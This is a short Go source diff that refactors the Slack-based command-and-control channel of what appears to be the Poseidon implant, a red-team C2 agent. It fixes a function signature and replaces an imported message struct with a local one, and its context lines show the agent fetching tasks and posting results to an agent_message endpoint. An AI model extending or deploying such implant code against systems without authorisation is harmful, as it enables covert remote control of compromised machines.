@@ -7,7 +7,6 @@ import (
 	"encoding/base64"
 	"encoding/json"
 	"fmt"
-	"github.com/xorrior/poseidon/pkg/utils/structs"
 	"io/ioutil"
 	"log"
 	"math"
@@ -95,7 +94,7 @@ func (s SlackC2) GetNextTask() []byte {
 	return s.htmlGetData(url)
 }
 
-func (s *SlackC2) PostMessage([]byte msg) []byte {
+func (s *SlackC2) PostMessage(msg []byte) []byte {
 	urlEnding := fmt.Sprintf("api/v%s/agent_message", ApiVersion)
 	return s.htmlPostData(urlEnding, msg)
 }
@@ -238,7 +237,7 @@ func (s *SlackC2) handleMessage(message interface{}) interface{} {
 
 	raw := s.htmlPostData(fmt.Sprintf("api/v%s/agent_message", ApiVersion), []byte(m.Data))
 	
-	resp := structs.Message{}
+	resp := Message{}
 	resp.Client = false 
 	resp.Tag = m.Tag
 	resp.Data = string(raw)
